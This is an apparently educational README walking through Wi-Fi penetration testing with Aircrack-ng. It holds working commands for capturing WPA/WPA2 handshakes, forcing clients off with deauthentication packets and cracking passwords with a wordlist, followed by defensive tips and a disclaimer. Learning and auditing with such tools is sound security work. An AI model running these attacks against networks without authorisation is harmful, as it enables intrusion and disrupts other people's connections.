
# Auditing and Attacking a Wi-Fi Network with Aircrack-ng

## 📌 Project Overview
This project demonstrates how to use **Aircrack-ng**, a powerful suite of tools for **Wi-Fi security auditing**, to analyze and exploit vulnerabilities in **wireless networks**. The objective is to **test network security** and learn penetration testing techniques for ethical hacking.

By using **Aircrack-ng** on **Kali Linux**, we can assess network vulnerabilities and strengthen security measures.

---

## 🛠 Tools Used
To perform **Wi-Fi security testing**, the following tools are used:

- **Kali Linux** (for ethical hacking)
- **Aircrack-ng** (Wi-Fi penetration testing suite)
- **Wireshark** (for packet analysis)
- **Wi-Fi Adapter** (must support **monitor mode**)

---

## ⚡ Key Tasks
The following penetration testing activities are performed:

1. **📡 Enabling Monitor Mode on a Wi-Fi adapter**
2. **🔍 Discovering Wi-Fi Networks and their security settings**
3. **📶 Capturing Handshake Packets for password cracking**
4. **🔓 Cracking WEP/WPA/WPA2 passwords using wordlists**
5. **📊 Analyzing Captured Packets using Wireshark**

---

## 🚀 How to Run

### ✅ Step 1: Install Aircrack-ng (if not pre-installed)
Update the package list and install **Aircrack-ng**:

\`\`\`bash
sudo apt-get update && sudo apt-get install aircrack-ng
\`\`\`

Verify installation:

\`\`\`bash
aircrack-ng --help
\`\`\`

---

### ✅ Step 2: Enable Monitor Mode
First, identify your Wi-Fi interface:

\`\`\`bash
iwconfig
\`\`\`

Put your Wi-Fi adapter into **Monitor Mode**:

\`\`\`bash
sudo airmon-ng start wlan0
\`\`\`

Replace `wlan0` with your **Wi-Fi adapter name**.

---

### ✅ Step 3: Discover Wi-Fi Networks
To scan nearby networks:

\`\`\`bash
sudo airodump-ng wlan0mon
\`\`\`

Take note of:
- **BSSID (MAC address)**
- **Channel (CH)**
- **Encryption Type (WEP/WPA/WPA2)**

---

### ✅ Step 4: Capture Handshake Packets
To capture handshake packets for **WPA/WPA2 cracking**, run:

\`\`\`bash
sudo airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
\`\`\`

Example:

\`\`\`bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
\`\`\`

Wait for a **client to connect**, or force disconnection:

\`\`\`bash
sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
\`\`\`

If successful, the **handshake** is captured in `capture.cap`.

---

### ✅ Step 5: Crack Wi-Fi Password
Use **Aircrack-ng** with a wordlist to crack the **WPA/WPA2 handshake**:

\`\`\`bash
sudo aircrack-ng -w rockyou.txt -b [BSSID] capture.cap
\`\`\`

Example:

\`\`\`bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap
\`\`\`

For **WEP networks**, use:

\`\`\`bash
sudo aircrack-ng -b [BSSID] capture.cap
\`\`\`

---

### ✅ Step 6: Analyze Captured Packets Using Wireshark
To analyze **network traffic**, open the capture file in **Wireshark**:

\`\`\`bash
wireshark capture.cap
\`\`\`

Apply filters to analyze **specific packets**:

- **Handshake packets:** `eapol`
- **Deauthentication attacks:** `wlan.fc.type_subtype == 0x0c`
- **Data packets:** `tcp or udp`

---

## 🛡️ Defensive Strategies
To protect against **Wi-Fi attacks**, implement:

- **Strong WPA2/WPA3 Passwords** (Use a long, complex passphrase).
- **MAC Address Filtering** (Restrict unauthorized devices).
- **Disable WPS (Wi-Fi Protected Setup)** (WPS is vulnerable to brute-force attacks).
- **Enable Network Encryption** (Use WPA3 if available).
- **Monitor for Rogue Access Points** (Use `airodump-ng` for detection).

---

## 🎯 Conclusion
This project demonstrates **Wi-Fi security testing** techniques using **Aircrack-ng** to **audit network vulnerabilities**. Understanding **penetration testing** helps secure **wireless networks** from attacks.

**🔹 Disclaimer:** This guide is for **educational purposes only**. Do not attempt unauthorized penetration testing.

---
### 📝 References:
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Wireshark Filters](https://www.wireshark.org/docs/dfref/)
- [Wi-Fi Security Best Practices](https://www.cyber.gov.au/)

